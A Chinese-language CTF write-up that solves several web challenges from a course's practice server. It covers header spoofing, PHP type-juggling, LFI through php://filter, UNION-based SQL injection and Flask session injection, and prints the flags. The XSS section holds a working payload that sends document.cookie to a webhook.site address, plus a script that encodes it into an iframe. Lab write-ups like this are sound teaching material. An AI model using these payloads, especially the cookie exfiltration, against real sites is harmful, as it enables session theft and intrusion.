## Web ctf
Try some questions 
## pekora
key concept : <font color=blue>**XFF 改變 IP位置**</font> 

[題目](http://ctf.adl.tw:12001/)
```cmd
命令提示字元輸入：

$curl http:/ctf.adl.tw:12001/ -H "x-forwarded-for:127.0.0.1" 

HTTP/1.1 200 OK
Date: Tue, 11 Jan 2022 13:41:50 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: _flags=RG9OX0RvMG4hIVBlazBfQ2hBbl9LYQ==
Vary: Accept-Encoding
Content-Length: 780
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>peko peko</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/rainbow.css" rel="stylesheet">
</head>

<body>
    <div class="text-center d-flex justify-content-center flex-column" style="height: 100vh"><h1><img src="./yagoo.png" alt="QURMe0QwME5fZE9vTl9EME9uXw=="></img></h1><p style="font-size: 3em;">this is the gift yagoo gives you V2EhaV9oQF9oQF9o0LRfaGFfaNC0fQ==</p>
        </div>    <script src="js/jquery-slim.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>

</html>
```
Base64 解碼:

alt = ADL{D00N_dOoN_D0On_

`<p>`內文字 = Wa!i_h@_h@_hд_ha_hд}

flag =  alt + `<p>`內的文字 = ADL{D00N_dOoN_D0On_Wa!i_h@_h@_hд_ha_hд}

## top secret 
key concept : <font color=blue>md5 sha1 安全漏洞</font> 

[題目](http://ctf.adl.tw:12002/)
```
<?php
show_source(__FILE__);
$flag = $_ENV["FLAG"];

$password = bin2hex(random_bytes(10));

extract($_GET);
if (!empty($guess) && $guess == $password)
{
    echo "WoW you find my secret password";
    if (md5($token1) == sha1($token2))
    {
        echo $flag;
    }
} else 
{
    die("NO :(");
}
```
```
網址輸入：ctf.adl.tw:12002/?password=1&guess=1&token1[]=Q&token2[]=1
```
1. 用`extract($_GET);`特性將`password`和`guess`改成自己的。
2. 因為md5和sha1都只能解讀string 而解讀array 並不會報錯而會回傳false。[參考](https://www.twblogs.net/a/5bafa13c2b7177781a0f37bf)

## hololive_1
key concept : <font color=blue>LFI漏洞 + dirsearch工具 </font>

[題目](http://ctf.adl.tw:12004/)

並且按上面button時會發現
```
網址變成：
http://ctf.adl.tw:12004/index.php?page=gura.html
```
可見換不同圖片是透過傳入get的page參數，所以這邊猜測是用LFI漏洞。

```
網址輸入：
http://ctf.adl.tw:12004/?page=php://filter/read=convert.base64-encode/resource=index.php
```

將index.php用base64-encode顯示出來，解base64後成功挖到index.php
```php=
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>hololiveEN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
</head>

<body>
    <center>
        <form action="index.php" method="get">
            <button class="btn btn-primary" name="page" type="submit" value="gura.html">gura</button>
            <button class="btn btn-primary" name="page" type="submit" value="ame.html">ame</button>
            <button class="btn btn-primary" name="page" type="submit" value="calli.html">calli</button>
            <button class="btn btn-primary" name="page" type="submit" value="ina.html">ina</button>
            <button class="btn btn-primary" name="page" type="submit" value="kiara.html">kiara</button>
        </form>
    </center>
    <div class="text-center d-flex justify-content-center flex-column" style="height: 100vh">
        <p style="font-size: 3em;">
            <?php
            $file = $_GET['page'];
            if (isset($file)) {
                include($file);
            } else {
                include('gura.html');
            }
            ?>
        </p>
    </div>
    <script src="js/jquery-slim.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</html>
```
但其實 index.php 沒什麼哈哈

dirsearch 尋找 index.php 發現有 login.php
```

$ python3 dirsearch.py -u http://ctf.adl.tw:12004/

21:59:01] 301 -  314B  - /js  ->  http://ctf.adl.tw:12004/js/
[21:59:02] 403 -  278B  - /.ht_wsr.txt
[21:59:02] 403 -  278B  - /.htaccess.bak1
[21:59:02] 403 -  278B  - /.htaccess.sample
[21:59:02] 403 -  278B  - /.htaccess.orig
[21:59:02] 403 -  278B  - /.htaccess.save
[21:59:02] 403 -  278B  - /.htaccess_orig
[21:59:02] 403 -  278B  - /.htaccessBAK
[21:59:02] 403 -  278B  - /.htaccessOLD
[21:59:02] 403 -  278B  - /.htaccess_sc
[21:59:02] 403 -  278B  - /.htaccessOLD2
[21:59:02] 403 -  278B  - /.html
[21:59:02] 403 -  278B  - /.htm
[21:59:02] 403 -  278B  - /.htpasswd_test
[21:59:02] 403 -  278B  - /.httr-oauth
[21:59:02] 403 -  278B  - /.htpasswds
[21:59:03] 403 -  278B  - /.htaccess_extra
[21:59:18] 301 -  315B  - /css  ->  http://ctf.adl.tw:12004/css/
[21:59:22] 301 -  315B  - /img  ->  http://ctf.adl.tw:12004/img/
[21:59:22] 200 -    2KB - /index.php
[21:59:22] 200 -    2KB - /index.php/login/
[21:59:23] 403 -  278B  - /js/
[21:59:24] 200 -    2KB - /login.php
[21:59:33] 403 -  278B  - /server-status/
[21:59:33] 403 -  278B  - /server-status

```
再輸入一次網址，把login.php挖出來

```http
網址輸入：
http://ctf.adl.tw:12004/?page=php://filter/read=convert.base64-encode/resource=login.php
```
 解base64 後得到 Flag (在註解)
```php
<?php
// ADL{ve5eeeeeeeeEEEE555ry_si!!iimple_LFI}
$host = 'db';
$dbuser = 'MYSQL_USER';
$dbpassword = 'MYSQL_PASSWORD';
$dbname = 'ctf_users';
$link = mysqli_connect($host, $dbuser, $dbpassword, $dbname);

$loginStatus = NULL;
$username = $_POST['ctf_username'];
$password = $_POST['ctf_password'];

if (isset($username) && isset($password)) {
    error_log('POST: [' . $username . '] [' . $password . ']');
    if ($link) {
        $sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
        $query = mysqli_query($link, $sql);
        $fetchs = mysqli_fetch_all($query, MYSQLI_ASSOC);
        if (count($fetchs) > 0) {
            foreach ($fetchs as $fetch) {
                if ($fetch["username"] === 'gura' && $fetch["password"] === $password) {
                    $loginStatus = True;
                    break;
                }
                $loginStatus = False;
            }
        } else {
            $loginStatus = False;
        }
    } else {
        $loginStatus = NULL;
    }
} else {
    $loginStatus = NULL;
}
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="Vongola">
    <title>Gura Dum</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/signin.css" rel="stylesheet">
    <link href="css/rainbow.css" rel="stylesheet">
</head>

<body class="text-center" style="display:block;padding: 0;">
    <?php
    if ($loginStatus === True) {
    ?>
        <div class="text-center d-flex justify-content-center flex-column" style="height: 100vh">
            <h1 class="rainbow" style="font-size: 5rem;">Login Success!</h2>
                <p style="font-size: 3em;">
                    <?php echo $_ENV["FLAG"], '<br>'; ?>
                </p>
        </div>
    <?php
    } else {
        if ($loginStatus === False) {
            echo '<div class="alert alert-danger" role="alert">Login Failed! Only admin can use this page to login!</div>';
        }
    ?>
        <div class="text-center d-flex align-items-center" style="height: 90%">
            <form class="form-signin" action="login.php" method="POST">
                <img class="mb-4" src="img/dum.png" width=300></img>
                <label for="inputUsername" class="sr-only">Username</label>
                <input type="text" id="inputUsername" class="form-control" placeholder="Username" name="ctf_username" required autofocus>
                <label for="inputPassword" class="sr-only">Password</label>
                <input type="text" id="inputPassword" class="form-control" placeholder="Password" name="ctf_password" required>
                <div class="checkbox mb-3">
                    <label>
                        <input type="checkbox" value="remember-me"> Remember me
                    </label>
                </div>
                <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
            </form>
        </div>
    <?php
    }
    ?>
    <script src="js/jquery-slim.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>

</html>
```

## hololive_2
key concept : <font color=blue>SQL injection</font> 

[題目是login.php](http://ctf.adl.tw:12004/login.php)

```
username = '/*union*/union/*select*/select+'gura','gura','gura' -- 

password = gura
```
1. 測試有幾個欄位 : 兩個欄位，出現錯誤，測試到對為止。
    ```
    username = '/*union*/union/*select*/select+'gura','gura' --
    password = gura
    ```
    
    出現錯誤樣子：
    
![](https://i.imgur.com/ExbORts.png)


    
3. `/*union*/`註解掉的詞變成空白
4. `--`將後面的都註解掉
5. 因為 `UNION SELECT` 如果在table中找不到正確值，則會暫時新增我們所蒐尋的欄位進table，並回傳。所以這邊我們把username和password改成我們自己設定的。

## msg_board
key concept : <font color=blue>XSS 留言板</font> 

[題目](http://ctf.adl.tw:12007/)

發現可以用 iframe 遷入javascript code (ascii)，所以這邊我們嵌入讓內部bot將自己的cookie傳入get網址中的flag參數並用get發送指定網址。
```javascrit
javascript:
    fetch('https://webhook.site/15777b00-a93c-4ce3-a75e-5f8afc14e2a9?\
           flag='+document.cookie).then((response) => 
           {return response.json();}).catch((error) => 
           {console.log('no');})
```
 [這個網頁](https://webhook.site/?fbclid=IwAR0PzMsA8CMTLpCQfhtUV38Qbh5oS-bPvotRPBz9tJCoEjsDi5j-_qM2lok#!/15777b00-a93c-4ce3-a75e-5f8afc14e2a9/26af9310-e1a9-476a-9f80-ae7d80c3823f/1)可以製造一個網址，並接收網址傳遞所得到的內容

 所以要求bot傳遞的網址為其中，網頁要求的網址
 
![](https://i.imgur.com/wxScAWG.png)

圖中可以發現，我們看到flag了

payload
```python
content = "javascript:fetch('https://webhook.site/b6d3460b-f270-42e1-a615-09293c122617?flag='+document.cookie).then((response) => {return response.json();}).catch((error) => {console.log('no');})"
result = "<iframe src=&#"
for i in content:
    result+=str(ord(i))
    result+=";&#"
result = result[:-3]+"><iframe>"
print(result)
```
```html
<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#102;&#101;&#116;&#99;&#104;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#101;&#98;&#104;&#111;&#111;&#107;&#46;&#115;&#105;&#116;&#101;&#47;&#49;&#53;&#55;&#55;&#55;&#98;&#48;&#48;&#45;&#97;&#57;&#51;&#99;&#45;&#52;&#99;&#101;&#51;&#45;&#97;&#55;&#53;&#101;&#45;&#53;&#102;&#56;&#97;&#102;&#99;&#49;&#52;&#101;&#50;&#97;&#57;&#63;&#102;&#108;&#97;&#103;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#46;&#116;&#104;&#101;&#110;&#40;&#40;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#41;&#32;&#61;&#62;&#32;&#123;&#114;&#101;&#116;&#117;&#114;&#110;&#32;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#46;&#106;&#115;&#111;&#110;&#40;&#41;&#59;&#125;&#41;&#46;&#99;&#97;&#116;&#99;&#104;&#40;&#40;&#101;&#114;&#114;&#111;&#114;&#41;&#32;&#61;&#62;&#32;&#123;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#39;&#110;&#111;&#39;&#41;&#59;&#125;&#41;></iframe>
```
## ayame 
key concept : <font color=blue>string injection (python format)</font> 

[題目](http://ctf.adl.tw:12005/)


從source 得到
```
from flask import Flask, request, make_response, redirect, session, render_template, send_file
import os
import json

app = Flask(__name__)
app.secret_key = os.urandom(32)

FLAG = os.environ.get('FLAG', 'ADL{TEST_FLAG}')
users_db = {
    'guest',
    'Ayame'
}


@app.route("/")
def index():

    if 'user_data' not in session:
        return render_template("login.html", message="Login Please :D")

    user = json.loads(session['user_data'])
    
    if user['Ayame'] == True and request.args.get("base64") == 'QXlhbWU=':
        return FLAG
    else:
        return render_template("welcome.html", username=user['username'])


@app.route("/login", methods=['POST'])
def login():
    data = '{"Ayame": false, "username": "%s"}' % (
        request.form["username"]
    )
    session['user_data'] = data
    return redirect("/")


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")


@app.route("/source")
def source():
    return send_file(__file__, mimetype="text/plain")


if __name__ == '__main__':
    app.run(threaded=True, debug=True)
```
我們利用輸入 post 到/login，新增欄位至session
```
輸入：name","Ayame":true,"hello":"123
```

再將
```
網址改成：http://ctf.adl.tw:12005/?base64=QXlhbWU%3D
```
按下`enter`，就會將base64內容傳過去，並且因為`=`在網址列中是投入參數，所以這邊我們改成ascii code
